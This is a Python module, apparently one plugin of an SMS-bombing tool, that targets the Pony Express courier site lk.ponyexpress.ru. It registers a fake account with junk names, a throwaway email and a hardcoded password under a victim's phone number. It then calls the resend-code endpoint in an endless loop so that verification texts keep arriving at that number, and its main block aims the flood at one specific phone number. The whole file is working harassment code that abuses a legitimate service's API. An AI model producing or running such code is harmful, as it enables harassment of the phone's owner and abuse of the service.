from base import Service
import aiohttp
import asyncio
import json
from loguru import logger
import sys
class Ponyexpress(Service):
	timeout = 180
	name = "lk.ponyexpress.ru"
	def format_number(phone):
		return f"+{phone[1]} {phone[2:5]} {phone[5:8]}-{phone[8:10]}-{phone[10:12]}"
	@Service.log	
	async def send_one(self, phone, session):
		data = {"name":"xdxd","middlename":"xdxd","surname":"xdxd","phone": self.format_number(phone),"email":"xamam53077@aramask.com","pass":"qH!Zg7dGp6PCTY2","passRepeat":"qH!Zg7dGp6PCTY2","agree":"true"}
		status, text = await self.make_request(session, url = "https://lk.ponyexpress.ru/api/v1/resendCode", json = data)	
		return (status, text)
	@classmethod	
	async def send_sms(self, phone):
		async with aiohttp.ClientSession() as session:
			status, text = await self.make_request(session, url = "https://lk.ponyexpress.ru/api/v1/createuser", json = {"name":"xdxd","middlename":"xdxd","surname":"xdxd","phone":self.format_number(phone),"email":"xamam53077@aramask.com","pass":"qH!Zg7dGp6PCTY2","passRepeat":"qH!Zg7dGp6PCTY2","agree":"true"})
			if json.loads(text)["success"] == True:
				await asyncio.sleep(self.timeout)
			while True:
				status, text =  await self.send_one(self, phone, session)	
				print(status, text)
				if status not in (200, 500):
					break	
				await asyncio.sleep(self.timeout)

if __name__ == "__main__":
	logger.remove(0)
	logger.add(sys.stderr, format = "<green>[{time:YYYY-MM-DD HH:mm:ss:SSS}]</green><blue>[{level}]</blue>[{extra[service]}] - {message}", level = "INFO", colorize = True, enqueue = True)
	logger.add(sys.stderr, format = "<green>[{time:YYYY-MM-DD HH:mm:ss:SSS}]</green><red>[{level}]</red>[{extra[service]}] - {message}\nError text: {extra[error]}", level = "ERROR", colorize = True, enqueue = True)
	asyncio.get_event_loop().run_until_complete(Ponyexpress.send_sms("+77084872859"))